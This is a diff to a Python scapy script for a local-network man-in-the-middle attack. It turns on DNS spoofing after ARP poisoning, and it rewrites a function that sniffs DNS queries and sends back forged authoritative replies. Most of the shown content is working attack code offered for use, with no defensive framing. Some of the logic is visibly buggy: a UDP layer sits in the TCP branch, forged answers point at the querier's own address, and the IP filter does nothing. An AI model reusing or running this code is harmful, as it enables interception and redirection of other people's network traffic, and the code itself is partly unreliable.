@@ -119,7 +119,7 @@ def arp_spoof_stealth(victim_ip, victim_mac, router_ip, attacker_mac=None):
     scapy.all.send(scapy.all.ARP(op=1, hwsrc=attacker_mac, psrc=router_ip, hwdst=victim_mac, pdst=victim_ip))
     sys.stdout = sys.__stdout__
 
-    #dns_spoofing()
+    dns_spoofing()
 
 def arp_poison(victim_ip, victim_mac, router_ip, router_mac, attacker_mac, iterations=100):
     logger.info("Start spoofing network on " + str(victim_ip))
@@ -150,48 +150,35 @@ def arp_poison_stealthy(victim_ip, victim_mac, router_ip, attacker_mac):
     sys.exit(1)
 
 
+#Give the interface of the netwerk, the IP adress to spoof a certain IP, if spoof_all is false.
 def dns_spoofing(interface= "enp0s3", ip = "192.168.56.101", spoof_all = True):
-    # queue = netfilterqueue.NetfilterQueue()
-    # netfilterqueue.QueueHandler.bind(queue_num, callback[, max_len[, range,[sock_len]]])
     while 1:
         dns_packet = scapy.all.sniff(iface=interface, filter ="dst port 53", count = 1)
 
-        if(not spoof_all):
-            if (ip != dns_packet[scapy.all.ip].src):
-                pass
-        print(1)
-        # if scapy.all.DNS in dns_packet:
-        dns_source_ip = dns_packet[0].getlayer(IP).src
         if not spoof_all:
-            if ip != dns_packet[scapy.all.ip].src:
+            if ip != dns_packet[scapy.all.IP].src:
                 pass
 
-        if scapy.all.DNS in dns_packet:
-            dns_source_ip = dns_packet[0].getlayer(scapy.all.IP).src
-            if dns_packet[0].haslayer(scapy.all.TCP):
-                dns_source_port = dns_packet[0].getlayer(scapy.all.TCP).sport
-            elif dns_packet[0].haslayer(scapy.all.UDP):
-                dns_source_port = dns_packet[0].getlayer(scapy.all.UDP).sport
-            else:
-                pass
+        if dns_packet[0].haslayer(scapy.all.TCP):
+            dns_source_port = dns_packet[0].getlayer(scapy.all.TCP).sport
+        elif dns_packet[0].haslayer(scapy.all.UDP):
+            dns_source_port = dns_packet[0].getlayer(scapy.all.UDP).sport
+        else:
+            pass
 
-            dns_query_id = dns_packet[0].getlayer(scapy.all.DNS).id
-            dns_query_count = dns_packet[0].getlayer(scapy.all.DNS).qdcount
-            dns_destination = dns_packet[0].getlayer(scapy.all.IP).dst
-            dns_query = dns_packet[0].getlayer(scapy.all.DNS).qd.qname
+        dns_query_id = dns_packet[0].getlayer(scapy.all.DNS).id
+        dns_query = dns_packet[0].getlayer(scapy.all.DNS).qd.qname
 
-            if dns_packet[0].haslayer(scapy.all.TCP):
-                spoofed_packet = scapy.all.IP(dst=dns_packet[scapy.all.IP].src) / \
-                                 scapy.all.TCP(dport=dns_source_port, sport=dns_packet[scapy.all.TCP].dport) / \
-                                 scapy.all.DNS(id=dns_query_id, qr=1, aa=1, qd=dns_packet[scapy.all.DNS].qd,
-                                               an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=ip))
-                scapy.all.packet.set_payload(scapy.all.str(spoofed_packet))
-                scapy.all.packet.accept()
-            else:
-                spoofed_packet = scapy.all.IP(dst=dns_packet[scapy.all.IP].src) / \
-                                 scapy.all.UDP(dport=dns_source_port, sport=dns_packet[scapy.all.UDP].dport) / \
-                                 scapy.all.DNS(id=dns_query_id, qr=1, aa=1, qd=dns_packet[scapy.all.DNS].qd,
-                                               an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=ip))
-                scapy.all.packet.set_payload(scapy.all.str(spoofed_packet))
-                scapy.all.packet.accept()
+        if dns_packet[0].haslayer(scapy.all.TCP):
+            spoofed_packet = scapy.all.IP(dst=dns_packet[0].getlayer(scapy.all.IP).src) / \
+                             scapy.all.UDP(dport=dns_source_port, sport=dns_packet[0].getlayer(scapy.all.TCP).dport) / \
+                             scapy.all.DNS(id=dns_query_id, qr=1, aa=1, qd=dns_packet[0].getlayer(scapy.all.DNS).qd,
+                                           an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=dns_packet[0].getlayer(scapy.all.IP).src))
+            scapy.all.send(spoofed_packet)
+        else:
+            spoofed_packet = scapy.all.IP(dst=dns_packet[0].getlayer(scapy.all.IP).src) / \
+                             scapy.all.UDP(dport=dns_source_port, sport=dns_packet[0].getlayer(scapy.all.UDP).dport) / \
+                             scapy.all.DNS(id=dns_query_id, qr=1, aa=1, qd=dns_packet[0].getlayer(scapy.all.DNS).qd,
+                                           an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=dns_packet[0].getlayer(scapy.all.IP).src))
+            scapy.all.send(spoofed_packet)
 
